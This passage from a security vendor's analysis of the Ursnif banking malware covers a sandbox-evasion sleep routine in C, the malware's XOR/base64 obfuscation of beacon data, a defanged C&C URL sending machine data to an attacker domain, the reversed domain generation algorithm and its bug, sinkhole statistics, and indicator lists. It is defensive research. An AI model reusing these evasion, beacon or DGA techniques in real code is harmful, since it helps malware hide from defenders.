event*/</span><br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Sleeping for [%d] seconds\n"</span>), dwSleepTime);<br>&nbsp; &nbsp; &nbsp; &nbsp; dwWaitResult = <span style="color: #0000ff;">WaitForSingleObject</span>(hTimer, <span style="color: #800080;">INFINITE</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">WAIT_OBJECT_0</span> != dwWaitResult)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"WaitForSingleObject failed: [%d]"</span>), dwWaitResult);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_WAIT_EVENT</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Success */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_SUCCSES</span>;<br><span style="color: #0000ff;">lblCleanUp:</span><br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">NULL</span> != hTimer)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">CloseHandle</span>(hTimer);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hTimer = <span style="color: #800080;">NULL</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br>return tRetVal;<br>}<br><span style="color: #0000ff;">INT _tmain</span>(DWORD dwArgc, LPTSTR *lpszArgv)<br>{<br>&nbsp; &nbsp; &nbsp; &nbsp; E_CODE tRetVal = <span style="color: #800080;">E_FAILURE</span>;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #0000ff;">SleepingMechanism</span>(<span style="color: #800080;">SLEEP_TIME</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">E_SUCCSES</span> != tRetVal)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Failure: [%d]"</span>), (DWORD)tRetVal);<br>&nbsp; &nbsp; &nbsp; &nbsp; else<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Success\n"</span>));<br><br>&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br>}</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><span style="color: #333333;"><br><strong><u>The Additional Evasive Techniques and the DGA Flaw<br></u></strong></span><span style="color: #333333;">Once the attacker tool is able to evade the sandbox, it will try to evade network security solutions which are based on communication pattern signatures. Let's examine two such evasive techniques:</span></p>
<p><span style="color: #333333;"><u>Obfuscating the outbound traffic<br></u></span><span style="color: #333333;">The first data sent from the infected machine would start with the following string format:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>soft=1&amp;version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;crc=%x</strong></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;"><br>After adding the values which represent the machine (will not be discussed in this blog post) to the format string, the malware will xor the original value and move on to base64 encoding. Thereafter removing the "=" padding.<br><br></span></p>
<table style="border-color: #808080; width: 80%; height: 11px; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td>
<p><strong>W+WIpnoUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwNBQ6dP+msKM1eHuJg8mb5vu2siAOn72yyGQxwIDyVrNC1VsGTgKilQ5n64xxRm4NMqJxQP8Mw</strong></p>
</td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">Then adding "/" at random offsets of the string, following with changing every unique letter (which doesn’t match [a-zA-Z0-9]) to its hexadecimal format starting with "_". For example the letter "+" hex representation is 2B, and the letter "/" hex representation is 2F, so the output will end up looking like:</span></p>
<table style="width: 80%; border-color: #808080; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><span><strong>W<span style="color: #ff0000;">_2B</span>WIpn<span style="color: #ff0000;">_2F</span>oUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwN<span style="color: #ff0000;">_2F</span>BQ6dP<span style="color: #ff0000;">_2B</span>msKM1eHuJg<span style="color: #ff0000;">_2F</span>8mb5vu2siAOn72yyGQxwIDyVrNC1VsGTgKilQ5n64xxRm4NMqJxQP8Mw</strong></span></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">Finally, there is a second call to the function, adding the "/" slash character at random offsets and then the string is complete.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>W_2BWIpn_2FoUOvyD3ExoGO<span style="color: #ff0000;">/</span>YmmDu0bmT8<span style="color: #ff0000;">/</span>a0IQc2p7qTZymZCHt<span style="color: #ff0000;">/</span>8eu27PEunoWs<span style="color: #ff0000;">/</span>t7LOJNxEVYB<span style="color: #ff0000;">/</span>inB9iwN_2FBQ6d<span style="color: #ff0000;">/</span>P_2BmsKM1eHuJg_2F8mb5<span style="color: #ff0000;">/</span>vu2siAOn72yyGQxw<span style="color: #ff0000;">/</span>IDyVrNC1VsGTgKi<span style="color: #ff0000;"></span>lQ5n64xxRm4NMqJxQP<span style="color: #ff0000;">/</span>8Mw</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">This is sent to the C&amp;C server with the following format:</span><br><span style="color: #333333;">"&lt;Domain&gt;/images/&lt;CraftedBase64Url&gt;.gif"<br></span><span style="color: #333333;">where the &lt;Domain&gt; will be chosen by the DGA algorithm, and the &lt;CraftedBase64Url&gt; is what we just created.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong><span style="color: #ff0000;">http://thiscrevmscllevelfak[.]club/images/</span>W_2BWIpn_2FoUOvyD3ExoGO/YmmDu0bmT8/a0IQc2p7qTZymZCHt/8eu27PEunoWs/t7LOJNxEVYB/inB9iwN_2FBQ6d/P_2BmsKM1eHuJg_2F8mb5vu2siAOn72yyGQxw/IDyVrNC1VsGTgKi/lQ5n64xxRm4NMqJxQP/8Mw<span style="color: #ff0000;">.gif</span></strong></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><span style="background-color: #ccffff;"><span style="color: #ff0000;"></span></span><span style="color: #333333;"><u>Domain Generation Algorithm (DGA)<br></u></span><span style="color: #333333;">When I first reverse engineered the DGA and tried to recreate it using Python, for some reason my code didn’t work as expected and I got different results compared to the actual domains used by the attackers. When I reversed everything slowly and made sure my code does exactly what it is supposed to – I found out that they have some logical flaw in the code. Whether this was intentional or not, I will let you be the judge. But I am pretty sure it was unintentional. Let's see what exactly is going on in there step by step:</span></p>
<p><span style="color: #333333;"><u>Step One</u>:</span><br><span style="color: #333333;">Download a predefined wordlist from an online text file.</span><br><span style="color: #333333;">In python that would be as easy as using urllib2.urlopen.</span></p>
<p><span style="color: #333333;"><u>Step Two</u>:</span><br><span style="color: #333333;">Obtain all the words that are at least 3 letters long. In python that would be: " <span style="background-color: #cccccc;">re.findall("[a-zA-Z]{3,}", data)</span> "</span></p>
<p><span style="color: #333333;"><u>Step Three</u>:</span><br><span style="color: #333333;">Add a null termination (0x00) after every word that matched, in the original buffer.</span></p>
<p><span style="color: #333333;"><u>Step Four</u>:</span><br><span style="color: #333333;">Override the original data with the matching words, after every word add space bar.</span><br><span style="font-size: 14px; color: #333333;"><strong>(Author comments</strong>: This is necessarily shorter than the original buffer so it should potentially work, but in general this is very bad code.)</span></p>
<p><span style="color: #333333;"><u>Step Five</u>:</span><br><span style="color: #333333;">Create the domain using the strings in the buffer list of Step Three.</span></p>
<p><span style="color: #333333;">Now, the problem exists at Step Four, let's take a look at the assembly:</span></p>
<p><span style="color: #333333;"><img src="http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=677&amp;height=566&amp;name=IdaDump.jpg" alt="" title="IdaDump.jpg" width="677" height="566" style="display: block; margin-left: auto; margin-right: auto;" srcset="http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=339&amp;height=283&amp;name=IdaDump.jpg 339w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=677&amp;height=566&amp;name=IdaDump.jpg 677w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1016&amp;height=849&amp;name=IdaDump.jpg 1016w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1354&amp;height=1132&amp;name=IdaDump.jpg 1354w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1693&amp;height=1415&amp;name=IdaDump.jpg 1693w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=2031&amp;height=1698&amp;name=IdaDump.jpg 2031w" sizes="(max-width: 677px) 100vw, 677px"></span></p>
<p><span style="color: #333333;">To understand the problem better, let's have a dummy buffer to demonstrate the issue.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>Match-Another se cu DEADBEEF le rt</strong></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;"><br>Applying the regex from Step Two would result in the following word list:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>["Match", "Another", "DEADBEEF"]</strong></td>
</tr>
</tbody>
</table>
<p><span style="background-color: #ccffff;"><strong><br></strong></span><span style="color: #333333;">Adding the null termination on the original string will make it look like:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match\x00Another\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">After that, we are going to copy each of those strings, override the original buffer with them, and add a space bar right after. This should result the matching strings being one after another ordered in that buffer. However, the first copy is the reason for the problem. We are first of all copying the original word over itself using 'lstrcpy', resulting in the same buffer.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match\x00Another\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">But after that, we are using 'lstrcat' to add a space after the word. The MSDN documentation of `lstrcat` states:</span> <strong>“lpString1 must be large enough to add lpString2 and the closing '\0'</strong><span style="color: #333333;">,” which means that there are going to be two more bytes added! One of them is the space, and the other one is the null termination coming right after, resulting in the following problem:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match \x00nother\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">As you can see, it overwrote some of the next word, which will eventually make it “lose” one of the words in the list making the whole wordlist short by one essentially affecting all of the DGA.</span></p>
<p><span style="font-size: 14px; color: #333333;"><strong>(Author Comments</strong>: I believe the malware authors have no idea they have such a bug in their code because they are probably using the exact same piece of code to know which domains they should buy.)</span></p>
<p><span style="color: #333333;">After I successfully reversed the DGA algorithm and could recreate it myself, we sinkholed one of the generated domains for the next domains cycle, and managed to find pretty interesting statistics about this family over a period of 5 days:</span></p>
<p>&nbsp;</p>
<table style="border-color: #e6e6e6; width: 100%; margin-left: auto; margin-right: auto;">
<thead>
<tr style="text-align: center; height: 21px; background-color: #808080;">
<td style="height: 21px; width: 34%;" colspan="2"><strong><span style="color: #ffffff;">DGA Characteristics</span></strong><span style="color: #ffffff;"></span></td>
<td style="height: 21px; width: 150%; background-color: #ffffff;">&nbsp;</td>
</tr>
</thead>
<tbody>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Type</td>
<td style="height: 21px; width: 18.0337%;">Dictionary based</td>
<td style="height: 99px; width: 150%;" rowspan="6"><img src="http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=528&amp;name=ChartClean.png" title="ChartClean.png" width="528" srcset="http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=264&amp;name=ChartClean.png 264w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=528&amp;name=ChartClean.png 528w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=792&amp;name=ChartClean.png 792w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1056&amp;name=ChartClean.png 1056w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1320&amp;name=ChartClean.png 1320w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1584&amp;name=ChartClean.png 1584w" sizes="(max-width: 528px) 100vw, 528px"></td>
</tr>
<tr style="height: 10px;">
<td style="height: 10px; width: 15.9663%;">Seed</td>
<td style="height: 10px; width: 18.0337%;">Current date</td>
</tr>
<tr style="height: 5px;">
<td style="width: 15.9663%; height: 5px;">Change frequency</td>
<td style="width: 18.0337%; height: 5px;">5 days period</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Domains per cycle</td>
<td style="height: 21px; width: 18.0337%;">15</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Top level domains</td>
<td style="height: 21px; width: 18.0337%;">.ru, .xyz, .club</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Total infected machines</td>
<td style="height: 21px; width: 18.0337%;">6,893</td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">On the analyzed sample, the DGA's dictionary (word list) is generated from this url: </span><br><span style="color: #333333;"><a href="http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt" style="color: #333333;">http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt</a></span></p>
<p><span style="color: #333333;">The interesting part of this DGA is the fact it can change the file from which the wordlist is generated, thus making it very easy to create different versions of the DGA for different purposes.</span></p>
<p><span style="color: #333333;">An example of actual domains generated from the dictionary:</span></p>
<p><span style="color: #444444;"><span>•</span> thiscrevmscllevelfak.club </span><br><span style="color: #444444;"><span>•</span> levelignorethenind.ru </span><br><span style="color: #444444;"><span>•</span> mtabaddresslocked.xyz </span><br><span style="color: #444444;"><span>•</span> consseriflistyleleft.club </span><br><span style="color: #444444;"><span>•</span> aresymbolparamspan.ru </span><br><span style="color: #444444;"><span>•</span> respondslemsonmsonum.club </span><br><span style="color: #444444;"><span>•</span> senddatalistenpython.xyz </span><br><span style="color: #444444;"><span>•</span> numfalseandyspan.ru </span><br><span style="color: #444444;"><span>•</span> maxsemihiddenmsosymbol.club </span><br><span style="color: #444444;"><span>•</span> cllockedlevelnbsple.club </span><br><span style="color: #444444;"><span>•</span> nbspserliststthelist.xyz </span><br><span style="color: #444444;"><span>•</span> symbolcontacttype.ru </span><br><span style="color: #444444;"><span>•</span> intoaddedprio.ru </span><br><span style="color: #444444;"><span>•</span> stylesendnblisprestval.xyz </span><br><span style="color: #444444;"><span>•</span> indentlspthatmcan.ru</span></p>
<p><span style="color: #444444;">Analyzed Samples:</span><br><span style="color: #444444;"><span>•</span> 9b38f10fd425b37115c81ad07598d930<br><span>•</span> b60c97d22f0ae301e916d61f79162b78<br><span>•</span> f50bd1585f601d41244c7e525b8bd96a</span></p>
<p style="text-align: center;"><span style="color: #333333;"># # #</span></p>
<p style="text-align: left;"><span>To see if Ursnif or other malware has&nbsp;bypassed your firewall rules or gateway without alerting you or blocking them altogether, we suggest you run the&nbsp;<a href="http://www.seculert.com/seculert-javelin" target="_blank">Seculert Javelin</a> Simulation Test. You may be surprised what it finds hiding in most networks.</span></p></span>
                </div>
                
            </div>
        </div>


        <!-- Optional: Blog Author Bio Box -->
        

    </div>
</div></div>

                </div><!--end row-->
                </div><!--end row-wrapper -->
                <div class="row-fluid-wrapper row-depth-1 row-number-5 ">
                <div class="row-fluid ">
                    <div class="container"><div class="row"><div class="an-form-subscrible">
                    <div class="span12 widget-span widget-type-blog_subscribe " style="" data-widget-type="blog_subscribe" data-x="0" data-w="12">
                        <div class="cell-wrapper layout-widget-wrapper">
                            <span id="hs_cos_wrapper_module_14504709930284405" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="blog_subscribe"><h3 id="hs_cos_wrapper_module_14504709930284405_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text">Subscribe to Email Updates</h3>

<div id="hs_form_target_module_14504709930284405"></div>

  
 


</span>
                        </div><!--end layout-widget-wrapper -->
                    </div><!--end widget-span -->
                    </div></div></div>
                </div><!--end row-->
                </div><!--end row-wrapper -->
            </div><!--end widget-span -->
    </div><!--end row-->
    </div><!--end row-wrapper -->
    <div class="row-fluid-wrapper row-depth-0 row-number-1 ">
    <div class="row-fluid ">
        <div class="span12 widget-span widget-type-raw_jinja " style="" data-widget-type="raw_jinja" data-x="0" data-w="12">
<div class="parallax-container valign-wrapper an-content-latest-blog an-content-form-section">
    <div class="section no-pad-bot">
      <div class="container">
        <h2 class="center an-title-section">Contact Us</h2>
        <div class="row">
          <h5 class="header col s12 center"> </h5>
          <div class="an-content-form">
            <span id="hs_cos_wrapper_contact_form" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_contact_form_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_contact_form"></div>

    
     


</span>
            <div class="clearfix"></div>  
          </div>    
        </div>
      </div>
    </div>
    <div class="parallax"><img src="" alt="Unsplashed background img 2"></div>
</div></div><!--end widget-span -->

    </div><!--end row-->
    </div><!--end row-wrapper -->
    <div class="row-fluid-wrapper row-depth-0 row-number-2 ">
    <div class="row-fluid ">
        <div class="span12 widget-span widget-type-global_widget " style="" data-widget-type="global_widget" data-x="0" data-w="12">
            <div class="cell-wrapper layout-widget-wrapper">
                <span id="hs_cos_wrapper_newseculert_footer" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_raw_html" style="" data-hs-cos-general-type="widget" data-hs-cos-type="raw_html" data-global-widget-id="3408863518">  <footer class="page-footer">
    <div class="footer-copyright">
      <div class="container">
        <p class="center">
          <a href="http://www.linkedin.com/company/seculert" title="Linkin"><img src="/hubfs/NewSeculertImages/icon-linkin.png" alt=""></a>
          <a href="https://twitter.com/seculert" title="Twitter"><img src="/hubfs/NewSeculertImages/icon-twiter.png" alt=""></a>
          <a href="https://www.facebook.com/Seculert" title="Facebook"><img src="/hubfs/NewSeculertImages/icon-face.png" alt=""></a>
        </p>
        <p class="center">© 2016 Seculert All Rights Reserved <a href="/privacy" title="Privacy Policy">Privacy Policy</a> | <a href="/terms-of-services" title="Terms of Service">Terms of Service</a> | <a href="/contact-us" title="Contact Us">Contact Us</a></p>
      </div>
    </div>
  </footer></span>
            </div><!--end layout-widget-wrapper -->
        </div><!--end widget-span -->
    </div><!--end row-->
    </div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">


    </div><!--end footer -->
</div><!--end footer wrapper -->


    
<script type="text/javascript" src="https://static.hsstatic.net/content_shared_assets/static-1.4020/js/public_common.js"></script>

    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->
 
<script src="https://js.hsforms.net/forms/v2.js"></script>

  <script>
      hbspt.forms.create({
          portalId: '237610',
          formId: '075be741-0339-4f22-a2f0-68ec7ccde5db',
          formInstanceId: '616',
          pageId: 4320511992,
          pageName: 'Ursnif: Deep Technical Dive',
          contentType: 'blog-post',
          
          redirectUrl: 'http://www.seculert.com/blogs/ursnif-deep-technical-dive?hsFormKey=3942cbf891f0d0e4d58c81f9a49760c0#module_14504709930284405',
          
          
          css: '',
          target: '#hs_form_target_module_14504709930284405',
          
          formData: {
            cssClass: 'hs-form stacked'
          }
      });
  </script>


        <!--[if lte IE 8]>
        <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
        <![endif]-->
     

    <script>
        hbspt.forms.create({
            portalId: '237610',
            formId: '4d7e59c0-c8ee-4551-8cba-25515162ee14',
            formInstanceId: '9925',
            pageId: 4320511992,
            
            
            
            
            pageName: "Ursnif: Deep Technical Dive",
            
            
            
            
            css: '',
            target: '#hs_form_target_contact_form',
            
            
            
            
            
            contentType: "blog-post",
            
            formData: {
            cssClass: 'hs-form stacked hs-custom-form'
            }
        });
    </script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "http:\/\/www.seculert.com\/blogs\/ursnif-deep-technical-dive"]);
_hsq.push(["setPageId", "4320511992"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 4320511992,
    "legacyPageId": "4320511992",
    "contentGroupId": 294026020,
    "abTestId": null,
    "languageVariantId": 4320511992,
    "languageCode": null
}]);
_hsq.push(["setTargetedContentMetadata", []]);


    (function(d,s,i,r) {
        if (d.getElementById(i)){return;}
        var n=d.createElement(s),e=d.getElementsByTagName(s)[0];
        n.id=i;n.src='//js.hs-analytics.net/analytics/'+(Math.ceil(new Date()/r)*r)+'/237610.js';
        e.parentNode.insertBefore(n, e);
    })(document,"script","hs-analytics",300000);


</script>



<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    ticks: 1475524287152,
    page_id: 4320511992,
    content_group_id: 294026020,
    portal_id: 237610,
    app_hs_base_url: "https://app.hubspot.com"
}
</script>



<!--— DO NOT REMOVE —-->
<script src="//cdn2.hubspot.net/hub/237610/hub_generated/style_manager/1418906521047/custom/page/Seculert-Dec2014-theme/Seculert-Dec2014-main.min.js"></script>
<!--— END DO NOT REMOVE —-->
<!-- Force24 Tracking-->
<script type="text/javascript" language="javascript">
    var clientId = '1D5A0697-EFC4-E511-866F-0050568C0022'; // Insert client id here
    document.write(unescape("%3Cscript src='" + document.location.protocol + 
    "//tracking1.force24.co.uk/tracking/script/" + clientId + 
    "' type='text/javascript' language='javascript'%3E%3C/script%3E")); 
    document.write(unescape("%3Cscript src='" + document.location.protocol + 
    "//tracking1.force24.co.uk/tracking/script/capture/" + clientId + 
    "' type='text/javascript' language='javascript'%3E%3C/script%3E"));
</script>
<!--End Force24 Tracking-->

<div id="fb-root"></div>
 <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&status=0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<script type="text/javascript">
  window.___gcfg = {
    lang: 'en-US',
    parsetags: 'onload'
  };
  (function() {
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
    po.src = 'https://apis.google.com/js/platform.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
  })();
</script>
 <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


    <!-- Generated by the HubSpot Template Builder - template version 1.03 -->

<!-- end coded_template: id:3368679407 path:generated_layouts/3368679387.html -->
</body></html>